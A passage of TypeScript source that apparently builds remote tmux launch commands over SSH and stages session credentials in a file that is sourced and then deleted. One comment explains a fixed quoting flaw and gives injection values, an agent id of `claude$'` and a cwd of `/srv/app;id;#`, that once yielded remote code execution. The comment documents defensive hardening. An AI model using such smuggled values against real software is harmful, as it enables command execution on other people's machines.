    // in a STRING replacement `$'`, `` $` ``, `$&` and `$$` are expansion patterns, and `$'`
    // splices the text FOLLOWING the match — `-s '<session>' -c '<cwd>' '<program>' '<args>'` —
    // straight INSIDE the single-quoted token being built. That inverts the quote parity of that
    // copy and un-quotes everything `remoteTmuxCommand` had carefully quoted, so an agent id of
    // `claude$'` plus a project cwd of `/srv/app;id;#` (both from the same `.nodeterm/project.json`)
    // was remote code execution EVEN WITH the posixQuote above. A function replacement is never
    // pattern-expanded, so the quoted bytes land verbatim. See control-master.injection.test.ts.
    cmd = cmd.replace('new-session -A ', () => `new-session -A ${extraEnv.map(posixQuote).join(' ')} `)
  if (sessionEnv) cmd = `${remoteSessionEnvPrologue(sessionEnv, confPath)}${cmd}`
  return ['-t', ...childArgs(conn, controlPath, cmd)]
}

/** Credentials for a remote session, delivered WITHOUT argv: a 0600 file (staged over the
 *  ControlMaster, content via stdin) that the remote command sources into the tmux client's env
 *  and deletes, plus the key NAMES (never values) the remote server's `update-environment` must
 *  learn at runtime — the conf bakes the fixed gateway list, but a custom agent's keys are
 *  user-defined. See session-env.ts for the whole design. */
export interface RemoteSessionEnv {
  /** Absolute remote path of the staged env file (built from the validated remote $HOME). */
  file: string
  /** Env names OUTSIDE the conf-baked gateway list to append to `update-environment`. */
  extraKeys: string[]
}

/** The shell prologue spliced before the remote tmux command. POSIX-sh only, one line. The
 *  wait-loop bridges the staging race (the upload is fire-and-forget from a synchronous spawn
 *  path); its budget is 40×50ms = 2s, after which the launch proceeds env-less and the agent
 *  fails loudly in the pane — fail-open never leaks and never wedges a terminal on a dead
 *  upload. The `rm -f` runs unconditionally so a late-landing file cannot linger at rest. */
function remoteSessionEnvPrologue(sessionEnv: RemoteSessionEnv, confPath?: string): string {
  const f = posixQuote(sessionEnv.file)
  const t = `tmux -L ${RMT_TMUX_SOCKET}`
  const parts: string[] = []
  // Names only ever come from isSafeEnvName-shaped keys, but this builder is exported territory —
  // re-filter at the splice point, the same idiom every other remote builder here uses.
  const keys = sessionEnv.extraKeys.filter((k) => /^[A-Za-z_][A-Za-z0-9_]*$/.test(k))
  if (keys.length) {
    // The option must exist on the server BEFORE new-session copies the client env, so start the
    // server (a no-op when warm) with the same conf new-session would use. The grep guard keeps a
    // long-lived server's array from accumulating one duplicate per spawn.
    parts.push(`${t}${confPath ? ` -f ${posixQuote(confPath)}` : ''} start-server 2>/dev/null;`)
    for (const k of keys) {
      parts.push(
        `${t} show-options -g update-environment 2>/dev/null | grep -q ' ${k}$' || ${t} set-option -ga update-environment ${k} 2>/dev/null;`
      )
    }
  }
  parts.push(
    `_nte=0; while [ ! -f ${f} ] && [ "$_nte" -lt 40 ]; do sleep 0.05; _nte=$((_nte+1)); done;`,
    `[ -f ${f} ] && . ${f} >/dev/null 2>&1; rm -f ${f};`
  )
  return parts.join(' ') + ' '
}
